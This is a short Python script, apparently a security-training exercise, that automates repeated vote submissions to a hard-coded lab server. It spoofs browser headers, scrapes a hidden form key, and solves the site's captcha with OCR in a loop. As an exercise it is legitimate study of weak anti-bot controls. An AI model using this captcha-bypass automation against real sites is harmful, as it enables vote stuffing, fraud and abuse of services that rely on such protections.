#!/usr/bin/python3
"""3-script module"""
import requests
from bs4 import BeautifulSoup
import pytesseract


url = "http://158.69.76.135/level3.php"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0)'
           + ' Gecko/20100101 Firefox/100.0', 'referer': url}
cap_url = "http://158.69.76.135/captcha.php"
i = 0

while i < 1024:
    session = requests.Session()
    auth = session.get(url, headers=headers).text
    soup = BeautifulSoup(auth, 'html.parser')
    with open('captcha.png', 'wb') as f:
        f.write(session.get(cap_url).content)
    cap = pytesseract.image_to_string('captcha.png')[:-2]
    key = soup.find(type="hidden")['value']
    data = {'id': "4281", 'holdthedoor': "submit", 'key': key, 'captcha': cap}
    check = session.post(url, data=data, headers=headers)
    if str(check.content) != "b'See you later hacker![11]'":
        i += 1
